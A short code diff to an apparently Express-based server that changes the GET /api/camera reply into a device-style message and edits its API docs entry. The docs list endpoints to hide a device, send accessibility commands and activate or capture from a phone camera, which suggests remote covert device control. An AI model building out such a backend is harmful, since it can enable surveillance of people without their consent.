@@ -442,16 +442,24 @@ app.post('/api/camera', (req, res) => {
     }
 });
 
-// 🆕 ADD GET ENDPOINT FOR TESTING
+// 🆕 UPDATED GET ENDPOINT - Actual camera response instead of test message
 app.get('/api/camera', (req, res) => {
+    const currentTime = new Date().toLocaleTimeString('en-IN', { 
+        hour: '2-digit', 
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false 
+    });
+    
     res.json({
         success: true,
-        message: 'Camera endpoint is working! ✅',
-        method: 'GET',
-        available_actions: ['activate', 'capture', 'record', 'deactivate'],
-        camera_types: ['front', 'back'],
+        message: `Front cam Samsung_Device ${currentTime}`,
+        method: "GET", 
+        device_model: "Samsung_Device",
+        action: "activate",
+        camera_type: "front", 
         timestamp: new Date().toISOString(),
-        note: 'Use POST method for actual camera commands'
+        note: "GET request received - Use POST for device-specific commands"
     });
 });
 
@@ -640,7 +648,7 @@ app.get('/api/docs', (req, res) => {
                 'POST /api/hide-device': 'Hide/unhide device',
                 'POST /api/accessibility-command': 'Accessibility command',
                 'POST /api/camera': 'Camera command (activate/deactivate)',
-                'GET /api/camera': 'Test camera endpoint'
+                'GET /api/camera': 'Camera endpoint'
             },
             website: {
                 'GET /api/website/users': 'Get all users',
